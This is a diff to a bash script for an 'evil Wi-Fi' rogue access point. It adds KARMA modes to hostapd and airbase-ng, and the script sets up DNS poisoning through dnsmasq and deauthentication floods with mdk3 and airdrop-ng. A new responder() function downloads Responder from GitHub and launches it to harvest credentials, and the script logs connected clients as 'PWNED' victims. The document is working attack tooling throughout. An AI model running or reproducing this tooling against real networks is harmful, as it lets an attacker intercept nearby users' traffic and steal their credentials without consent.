@@ -43,9 +43,13 @@ echo "
  |___|\_/|_|_|_____|_|_| |_|
 "
 }
+function DATETIME(){
+datestamp=$(date +%F)
+timestamp=$(date +%I-%M-%S-%p)
+printf "$timestamp\n";
+}
 function setupenv(){
-datestamp=$(date +%F_%I-%M-%S-%p)
-echo "| [ >> ] SETTING UP!";
+printf "| [ >> ] SETTING UP! @ "; DATETIME;
 REVISION=054
 mydistro="`awk '{print $1}' /etc/issue`"
 myversion="`awk '{print $2}' /etc/issue`"
@@ -58,7 +62,7 @@ initpath=`pwd`
 hostname=$(hostname)
 resolution=$(xdpyinfo | grep 'dimensions:' | awk -F" " {'print $2'} | awk -F"x" {'print $1'})
 folder=/tmp/.evilwifi
-sessionfolder=$folder/$datestamp;
+sessionfolder=$folder/$datestamp/$timestamp;
 settings=/etc/evilwifi.conf
 lockfile=$folder/evilwifi.lock
 dhcpconf=/etc/dhcp3/dhcpd.conf
@@ -66,7 +70,7 @@ hostapdconf=$sessionfolder/config/hostapd.conf
 arpaaddr=$(echo $TAPIP|rev)
 # if [ -f $lockfile ]; then echo "$lockfile Detected - Script Halted!"; exit 1; fi
 if [ ! -d $folder ]; then mkdir $folder; fi
-mkdir $sessionfolder;
+mkdir -p $sessionfolder;
 mkdir $sessionfolder/logs;
 mkdir $sessionfolder/pids;
 mkdir $sessionfolder/pcaps;
@@ -77,16 +81,17 @@ touch $sessionfolder/logs/missing.log;
 touch $sessionfolder/config/hostapd.deny;
 touch $sessionfolder/config/hostapd.accept;
 touch $lockfile;
+}
+function STARTTERM(){
 if [ "$COLORTERM" = "xfce4-terminal" ]; then
-TERM="xfce4-terminal --hide-menubar --title \"$TERMTITLE\" ";
-fi
+xfce4-terminal --hide-menubar --title $TERMTITLE -e "$(echo $TERMCMD)"; fi
 if [ "$COLORTERM" = "gnome-terminal" ]; then
-TERM="gnome-terminal --hide-menubar --title \"$TERMTITLE\" ";
-fi
+gnome-terminal --hide-menubar --title $TERMTITLE -e "$(echo $TERMCMD)"; fi
 if [ "$COLORTERM" = "xterm" ]; then
-TERM="xterm +aw +bc +fullscreen -bg black -fg green -T \"$TERMTITLE\" ";
-fi
-echo "| [$OK] $datestamp";
+xterm +aw +bc +fullscreen -bg black -fg green -T $TERMTITLE -e "$(echo $TERMCMD)"; fi
+unset TERMGEO
+unset TERMTITLE
+unset TERMCMD
 }
 function debugenv(){
 echo "###################################"
@@ -143,7 +148,7 @@ echo "# END OF DEBUG MODE AWWWWWWWWWWWW #"
 echo "###################################"
 }
 function injectiontest(){
-echo "[>] Injection Test";
+printf "[>] Injection Test @ "; DATETIME;
 aireplay-ng -9 $MONIFACE > $sessionfolder/logs/injectiontest.log
 sleep 3
 if grep -q 'Injection is working!' $sessionfolder/logs/injectiontest.log; then
@@ -153,7 +158,6 @@ zenity --error --text "Injection is not working. Reconnect your wireless card an
 echo
 exit
 fi
-echo "[$OK] DONE -> $datestamp";
 }
 function killscript(){
 echo "Detected CTRL+C..."
@@ -167,32 +171,28 @@ trap killscript INT HUP;
 # INTERNET TESTING #
 ####################
 function icmptest(){
-echo "| [ >> ] ICMP TEST";
+printf "| [ >> ] ICMP TEST @ "; DATETIME;
 
-echo "| [$OK] $datestamp";
 }
 function pinginternet(){
-echo "| [ >> ] WAN ICMP TEST";
+printf "| [ >> ] WAN ICMP TEST @ "; DATETIME;
 INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
 if [ "$INTERNETTEST" = "64" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
 WANIP=$(curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+')
 if [ "$WANIP" != "" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
-echo "| [$OK] $datestamp";
 }
 function dnscheck(){
-echo "| [ >> ] DNS TEST";
+printf "| [ >> ] DNS TEST @ "; DATETIME;
 DNSCHECK=$(awk '/bytes from/ { print $1 }' < <(ping raw.github.com -c 1 -w 3))
 if [ "$DNSCHECK" = "64" ]; then DNS=TRUE; else DNS=FALSE; fi
-echo "| [$OK] $datestamp";
 }
 function pinggateway(){
-echo "[ >> ] GATEWAY ICMP TEST";
+printf "[ >> ] GATEWAY ICMP TEST @ "; DATETIME;
 GATEWAYRDNS=$(awk '/br-lan/ && /UG/ {print $2}' < <(route))
 GATEWAY=$(awk '/br-lan/ && /UG/ { print $2 }' < <(route -n))
 echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
 GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 3))
 if [ "$GATEWAYTEST" = "64" ]; then echo "Reply from $GATEWAY: bytes=64"; else echo "Request timed out."; fi
-echo "[$OK] DONE -> $datestamp";
 }
 function pingvictim(){
 echo "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
@@ -232,7 +232,7 @@ fi
 # DEPENDENCY SECTION #
 ######################
 function depends(){
-echo "| [ >> ] Dependency Check Started"
+printf "| [ >> ] Dependency Check Started @ "; DATETIME;
 if [ $UID -eq 0 ]; then echo "We are root: `date`" >> $LOG
 else
 echo "[$CRIT] Please Run This Script As Root or With Sudo!";
@@ -254,7 +254,6 @@ warnarray=( airdrop-ng arpspoof dpkg driftnet dsniff ettercap hostapd mdk3 msfco
 for depend in ${warnarray[@]}; do
 type -P $depend &>/dev/null || { echo "| [$WARN] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
 done
-echo "| [$OK] $datestamp";
 }
 function uninstalldeps(){
 echo "[>] REMOVING AIRCRACK-NG!";
@@ -267,7 +266,7 @@ cd /usr/src/hostapd-1.0-karma/hostapd;
 make clean &>/dev/null;
 rm -rf /usr/local/bin/hostapd;
 rm -rf /usr/local/bin/hostapd_cli;
-echo "[$OK] DONE -> $datestamp";
+DATETIME
 }
 function installdeps(){
 echo "[>] INSTALLING DEPENDS! (internet required)";
@@ -280,7 +279,7 @@ apt-get install libnl-dev -y;
 [ -d "/usr/src/aircrack-ng" ] || installaircrack;
 [ -d "/usr/src/hostapd-1.0-karma" ] || installhostapd;
 installlighttpd;
-echo "[$OK] DONE -> $datestamp";
+DATETIME
 }
 function installaircrack(){
 dpkg --force-depends --purge aircrack-ng;
@@ -289,7 +288,7 @@ cd /usr/src;
 rm -rf aircrack-ng*;
 echo "[>] CHECKING OUT AIRCRACK-NG!";
 svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng &>/dev/null;
-echo "[$OK] DONE -> $datestamp";
+DATETIME
 cd aircrack-ng;
 make uninstall &>/dev/null;
 make clean &>/dev/null;
@@ -297,7 +296,7 @@ echo "[>] STARTING MAKE! (watch for errors)";
 sleep 5;
 make &>$sessionfolder/logs/aircrack_make.log;
 make install &>$sessionfolder/logs/aircrack_make_install.log;
-echo "[$OK] DONE -> $datestamp";
+DATETIME
 echo "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
 sleep 3;
 airodump-ng-oui-update;
@@ -313,7 +312,7 @@ echo "[>] STARTING MAKE! (watch for errors)";
 sleep 5;
 make &>$sessionfolder/logs/hostapd_make.log;
 make install &>$sessionfolder/logs/hostapd_make_install.log;
-echo "[$OK] DONE -> $datestamp";
+DATETIME
 echo "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
 sleep 3;
 cd $initpath;
@@ -437,9 +436,42 @@ echo ""
 ######################
 # CONF FILES SECTION #
 ######################
-function hostapdconfig(){
+function hostapdnokarmaconfig(){
 echo "driver=nl80211" > $hostapdconf
-echo "enable_karma=$karma_enabled" >> $hostapdconf
+echo "enable_karma=0" >> $hostapdconf
+echo "karma_black_white=1" >> $hostapdconf
+echo "interface=$ATHIFACE" >> $hostapdconf
+echo "logger_syslog=-1" >> $hostapdconf
+echo "logger_syslog_level=2" >> $hostapdconf
+echo "logger_stdout=-1" >> $hostapdconf
+echo "logger_stdout=2" >> $hostapdconf
+echo "dump_file=$sessionfolder/logs/hostapd.dump" >> $hostapdconf
+echo "ctrl_interface=/var/run/hostapd" >> $hostapdconf
+echo "ctrl_interface_group=0" >> $hostapdconf
+echo "ssid=$ESSID" >> $hostapdconf
+echo "hw_mode=g" >> $hostapdconf
+echo "channel=$CHAN" >> $hostapdconf
+echo "beacon_int=$BEAINT" >> $hostapdconf
+echo "dtim_period=2" >> $hostapdconf
+echo "max_num_sta=2000" >> $hostapdconf
+echo "rts_threshold=2347" >> $hostapdconf
+echo "fragm_threshold=2346" >> $hostapdconf
+echo "macaddr_acl=0" >> $hostapdconf
+echo "accept_mac_file=$sessionfolder/config/hostapd.accept" >> $hostapdconf
+echo "deny_mac_file=$sessionfolder/config/hostapd.deny" >> $hostapdconf
+echo "auth_algs=3" >> $hostapdconf
+echo "ignore_broadcast_ssid=0" >> $hostapdconf
+#echo "wep_default_key=0" >> $hostapdconf
+#echo "wep_key0=123456789a" >> $hostapdconf
+echo "ap_max_inactivity=300" >> $hostapdconf
+echo "disassoc_low_ack=1" >> $hostapdconf
+#echo "ap_isolate=1" >> $hostapdconf
+#echo "ieee80211n=1" >> $hostapdconf
+#echo "access_network_type=0" >> $hostapdconf
+}
+function hostapdkarmaconfig(){
+echo "driver=nl80211" > $hostapdconf
+echo "enable_karma=1" >> $hostapdconf
 echo "karma_black_white=1" >> $hostapdconf
 echo "interface=$ATHIFACE" >> $hostapdconf
 echo "logger_syslog=-1" >> $hostapdconf
@@ -828,30 +860,35 @@ function startairbase(){
 modprobe tun
 sleep 2
 echo "* STARTING SERVICE: AIRBASE-NG *";
-airbase-ng -a $ATHIFACEMAC -c $CHAN -x $PPS -I $BEAINT $ESSID $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
+airbase-ng -a $ATHIFACEMAC -c $CHAN -x $PPS -I $BEAINT -e $ESSID $MONIFACE -v > $sessionfolder/logs/airbaseng.log &
+sleep 4
+}
+function startkarmaairbase(){
+modprobe tun
+sleep 2
+echo "* STARTING SERVICE: KARMA AIRBASE-NG *";
+airbase-ng -a $ATHIFACEMAC -c $CHAN -x $PPS -I $BEAINT -e $ESSID $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
+sleep 4
 }
 function startdnsmasq(){
 echo "no-poll" >> $dnsmasqconf
 echo "no-resolv" >> $dnsmasqconf
 echo "* DNSMASQ DNS POISON!!! *"
 TERMTITLE="DNSMASQ-POISON"
-$TERM -e \
-"dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
-unset TERMTITLE
+TERMCMD="dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
+STARTTERM
 }
 function startdnsmasqresolv(){
 echo "dhcp-option=wirelesslan,6,8.8.8.8,$TAPIP" >> $dnsmasqconf
 echo "* DNSMASQ With Internet *"
 TERMTITLE="DNSMASQ-INTERNET"
-$TERM -e \
-"dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
-unset TERMTITLE
+TERMCMD="dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
+STARTTERM
 }
 function dhcpdserver(){
 TERMTITLE="DHCP SERVER"
-$TERM -e \
-"dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/$TAPIFACE.pid $TAPIFACE"
-unset TERMTITLE
+TERMCMD="dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/$TAPIFACE.pid $TAPIFACE"
+STARTTERM
 }
 function nodhcpserver(){
 echo "* Not Using A Local DHCP Server *"
@@ -883,6 +920,14 @@ else
 echo "Apache2 Was Already Running"
 fi
 }
+function responder(){
+wget -a $sessionfolder/logs/wget.log -t 3 -T 10 -O /tmp/responder.zip https://github.com/SpiderLabs/Responder/archive/master.zip
+rm -rf /tmp/Responder-master
+unzip -q /tmp/responder.zip -d /tmp
+TERMTITLE="Python Responder"
+TERMCMD="python /tmp/Responder-master/Responder.py -i 0.0.0.0 --basic=1 --http=Off --ssl=Off --sql=Off --dns=Off"
+STARTTERM
+}
 #############################
 # SHELL SCRIPT VERBOSE MODE #
 #############################
@@ -894,7 +939,8 @@ echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
 echo "awk '/Probe/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", strftime(\"%H:%M:%S\"), \$5, \$8, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/hostapd.log)" >> $folder/probe.sh
 echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
 echo "awk '/AP-STA-CONNECTED/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: \n\", strftime(\"%H:%M:%S\"), \$3)}' < <(tail -f $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
-echo "awk '/DHCPACK/ && /$TAPIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
+echo "awk '/DHCPACK/ && /$BRLANIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
+echo "awk '/AP-STA-DISCONNECTED/ {printf(\"TIME: %s | MAC: %s | TYPE: DISCONNECTED  | IP: 000.000.000.000 | ESSID: \n\", strftime(\"%H:%M:%S\"), \$3)}' < <(tail -f $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
 echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
 #echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
 echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/logs/access.log)" >> $folder/web.sh
@@ -902,14 +948,14 @@ chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
 TERMTITLE="HTTP SERVER"
-$TERM -e "/bin/bash $folder/web.sh"
-unset TERMTITLE
-TERMTITLE="PWNED"
-$TERM -e "/bin/bash $folder/pwned.sh"
-unset TERMTITLE
+TERMCMD="/bin/bash $folder/web.sh"
+STARTTERM
 TERMTITLE="PROBE"
-$TERM -e "/bin/bash $folder/probe.sh"
-unset TERMTITLE
+TERMCMD="/bin/bash $folder/probe.sh"
+STARTTERM
+TERMTITLE="PWNED"
+TERMCMD="/bin/bash $folder/pwned.sh"
+STARTTERM
 #VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
@@ -923,7 +969,7 @@ echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
 echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/airbaseng.log)" >> $folder/probe.sh
 echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
 echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $sessionfolder/logs/airbaseng.log) &" >> $folder/pwned.sh
-echo "awk '/DHCPACK/ && /$TAPIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
+echo "awk '/DHCPACK/ && /$BRLANIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
 echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
 #echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
 echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/logs/access.log)" >> $folder/web.sh
@@ -931,14 +977,14 @@ chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
 TERMTITLE="HTTP SERVER"
-$TERM -e "/bin/bash $folder/web.sh"
-unset TERMTITLE
-TERMTITLE="PWNED"
-$TERM -e "/bin/bash $folder/pwned.sh"
-unset TERMTITLE
+TERMCMD="/bin/bash $folder/web.sh"
+STARTTERM
 TERMTITLE="PROBE"
-$TERM -e "/bin/bash $folder/probe.sh"
-unset TERMTITLE
+TERMCMD="/bin/bash $folder/probe.sh"
+STARTTERM
+TERMTITLE="PWNED"
+TERMCMD="/bin/bash $folder/pwned.sh"
+STARTTERM
 #VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
@@ -1047,8 +1093,10 @@ function softapmenu(){
 echo "+===================================+"
 echo "| Which AP Software?                |"
 echo "+===================================+"
-echo "| 1) Airbase-NG All Probes           "
-echo "| 2) HOSTAPD w KARMA                 "
+echo "| 1) HOSTAPD wITH KARMA              "
+echo "| 2) HOSTAPD NO KARMA                "
+echo "| 3) Airbase-NG WITH KARMA           "
+echo "| 4) Airbase-NG NO KARMA             "
 echo "+===================================+"
 echo ""
 read -e -p "Option: " softap
@@ -1114,11 +1162,13 @@ echo ""
 read -e -p "Option: " DEAUTHPROG
 if [ "$DEAUTHPROG" = "1" ]; then
 DEAUTHPROG=mdk3
+STARTTERM
 $TERM -e "mdk3 $MONIFACE d -c $CHAN -w $sessionfolder/logs/whitelist.txt"
 fi
 if [ "$DEAUTHPROG" = "3" ]; then
 DEAUTHPROG=airdrop-ng
 TERMTITLE=""
+STARTTERM
 $TERM -e \
 "airodump-ng --output-format csv --write $sessionfolder/pcap/dump.csv $MONIFACE"
 unset TERMTITLE
@@ -1127,6 +1177,7 @@ if [ -f != /usr/sbin/airdrop-ng ]; then
 ln -s /pentest/wireless/airdrop-ng/airdrop-ng /usr/sbin/airdrop-ng
 fi
 TERMTITLE=""
+STARTTERM
 $TERM -e \
 "airdrop-ng -i $MONIFACE -t $sessionfolder/pcap/dump.csv-01.csv -r $sessionfolder/logs/droprules.txt"
 unset TERMTITLE
@@ -1435,11 +1486,13 @@ done
 # SCRIPT ACTUALLY STARTS HERE #
 # --------------------------- #
 banner
+echo   "+===================================+"
 setupenv
 sleep 5
 # debugenv
 pinginternet
 depends
+echo   "+===================================+"
 # apachesetup
 # apachecheck
 if [ "$INTERNET" = "TRUE" ] && [ "$DNS" = "TRUE" ]; then checkupdate; fi
@@ -1449,19 +1502,24 @@ if [ "$internetmenu" = "2" ]; then installdeps; fi
 if [ "$internetmenu" = "3" ]; then forceupdate; fi
 if [ "$internetmenu" = "4" ]; then runscript; fi
 stopshit
+responder
 echo ""
 poisonmenu
 if [ -f != $settings ]; then softapmenu; fi
 if [ "$mode" != "2" ]; then dhcpmenu; fi
 if [ -f != $settings ]; then settings; fi
 # debugsettings
-if [ "$softap" = "1" ]; then TAPIFACE=at0; fi
+if [ "$softap" = "1" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
 if [ "$softap" = "2" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
+if [ "$softap" = "3" ]; then TAPIFACE=at0; fi
+if [ "$softap" = "4" ]; then TAPIFACE=at0; fi
 monitormodestop
 if [ "$mode" = "4" ]; then wepattackmenu; fi
 # debugsettings
-if [ "$softap" = "1" ]; then monitormodestart; startairbase; fi
-if [ "$softap" = "2" ]; then hostapdconfig; starthostapd; fi
+if [ "$softap" = "1" ]; then hostapdkarmaconfig; starthostapd; fi
+if [ "$softap" = "2" ]; then hostapdnokarmaconfig; starthostapd; fi
+if [ "$softap" = "3" ]; then monitormodestart; startkarmaairbase; fi
+if [ "$softap" = "4" ]; then monitormodestart; startairbase; fi
 sleep 2
 brlan
 # if [ "$mode" != "2" ]; then wireshark -i $TAPIFACE -k &; fi
@@ -1472,14 +1530,16 @@ if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
 if [ "$mode" = "2" ]; then DHCPSERVER=4; fi
 if [ "$mode" = "1" ]; then
 echo "# Generated by accesspoint.sh" > /etc/resolv.conf
-echo "nameserver 127.0.0.1" >> /etc/resolv.conf
+echo "nameserver $TAPIP" >> /etc/resolv.conf
 fi
 if [ "$mode" = "2" ]; then
 echo "# Generated by accesspoint.sh" > /etc/resolv.conf
 echo "nameserver 8.8.8.8" >> /etc/resolv.conf
 fi
-if [ "$softap" = "1" ]; then taillogsairbase; fi
-# if [ "$softap" = "2" ]; then taillogshostapd; fi
+if [ "$softap" = "1" ]; then taillogshostapd; fi
+if [ "$softap" = "2" ]; then taillogshostapd; fi
+if [ "$softap" = "3" ]; then taillogsairbase; fi
+if [ "$softap" = "4" ]; then taillogsairbase; fi
 fw_start
 attackmenu
 if [ "$attack" = "1" ]; then deauth; fi
